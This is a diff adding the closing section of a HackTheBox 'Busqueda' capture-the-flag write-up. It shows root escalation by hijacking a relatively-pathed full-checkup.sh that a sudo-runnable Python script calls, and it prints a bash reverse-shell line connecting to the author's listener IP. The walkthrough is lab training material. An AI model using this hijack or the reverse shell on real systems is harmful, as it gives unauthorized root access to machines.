@@ -126,16 +126,45 @@ Nice!
 
 ![21](Screenshots/Busqueda_21.jpg)
 
+```administrator/Scripts``` is immediately eye-catching, so let's explore that. We see that this is the ```/opt/scripts``` directory on the target machine that we ran ```system-checkup.py``` from.
 
+![22](Screenshots/Busqueda_22.jpg)
 
+With our admin privileges, we can now analyze the source code for these scripts. Let's start with the script that we ran, ```system-checkup.py```.
 
+![23](Screenshots/Busqueda_23.jpg)
 
+Our vector is apparent now. When the python script is ran with the ```full-checkup``` option, it creates a subprocess with a previously defined ```run_command()``` function that takes in as an argument and runs ```./full-checkup.sh```. Now the intended functionality of the python script is obviously to run the ```full-checkup.sh``` script in the same directory as ```system-checkup.py```, but since it is referenced with a relative path, we can potentially create a new, malicious bash script with the same name in a directory we can write to have that script run instead. The dots are all connecting now. Additionally, since we can run ```system-checkup.py``` as `root`, ```full-checkup.sh``` will inherit that privilege. This can give us a reverse shell as ```root```.
 
+![24](Screenshots/Busqueda_24.jpg)
 
+Let's test this hypothesis out. I created a fake ```full-checkup.sh``` file in the ```svc``` user's home directory with this code that will initiate a connection back to our listener:
 
+```
+#!/bin/bash
 
+bash -i >& /dev/tcp/10.10.15.194/4445 0>&1
+```
 
+Now, running ```system-checkup.py``` in the ```svc``` user's home directory, we get a reverse shell back on our listener as ```root```.
 
+![26](Screenshots/Busqueda_25.jpg)
+
+![27](Screenshots/Busqueda_26.jpg)
+
+Finally, navigating to the ```/root``` directory, we can get the root flag.
+
+![28](Screenshots/Busqueda_27.jpg)
+
+Nice pwn!
+
+## Contact
+
+Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>
+
+LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>
+
+HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
 
 
 
